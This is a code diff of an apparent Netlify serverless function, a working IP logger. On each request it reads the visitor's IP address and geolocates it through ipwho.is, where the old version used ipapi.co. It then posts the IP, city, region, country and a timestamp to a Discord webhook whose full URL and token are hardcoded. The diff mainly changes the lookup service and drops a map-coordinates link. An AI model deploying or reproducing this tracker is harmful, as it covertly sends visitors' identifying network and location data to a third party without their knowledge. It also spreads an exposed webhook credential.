@@ -3,7 +3,6 @@ const fetch = require('node-fetch');
 exports.handler = async (event, context) => {
   const webhookURL = "https://discord.com/api/webhooks/1379270305272299530/EdXC7ENWy6IzQiR1-ETKyeyitOmG_It2088qG3SROttMnLqzvp6YV879Wqs-WwIYa4yk";
 
-  // Extract IP address
   const ip =
     event.headers['x-nf-client-connection-ip'] ||
     event.headers['client-ip'] ||
@@ -13,27 +12,19 @@ exports.handler = async (event, context) => {
   const timestamp = new Date().toISOString();
 
   try {
-    // Get location info using ipapi.co
-    const geoRes = await fetch(`https://ipapi.co/${ip}/json/`);
+    const geoRes = await fetch(`http://ipwho.is/${ip}`);
     const geoData = await geoRes.json();
 
     const {
-      city = "Unknown City",
-      region = "Unknown Region",
-      country_name = "Unknown Country",
-      latitude,
-      longitude
+      country = "N/A",
+      region = "N/A",
+      city = "N/A"
     } = geoData;
-
-    const googleMapsLink = (latitude && longitude)
-      ? `https://www.google.com/maps?q=${latitude},${longitude}`
-      : "No coordinates available";
 
     const message = {
       content: `**IP:** ${ip}
-**Location:** ${city}, ${region}, ${country_name}
-**Time:** ${timestamp}
-**Map:** ${googleMapsLink}`
+**Location:** ${city}, ${region}, ${country}
+**Time:** ${timestamp}`
     };
 
     await fetch(webhookURL, {
@@ -44,13 +35,13 @@ exports.handler = async (event, context) => {
 
     return {
       statusCode: 200,
-      body: 'IP & location sent successfully!',
+      body: 'IP & location sent!',
     };
   } catch (error) {
-    console.error('Error fetching or sending data:', error);
+    console.error('Webhook failed:', error);
     return {
       statusCode: 500,
-      body: 'Something went wrong.',
+      body: 'Error sending data',
     };
   }
 };
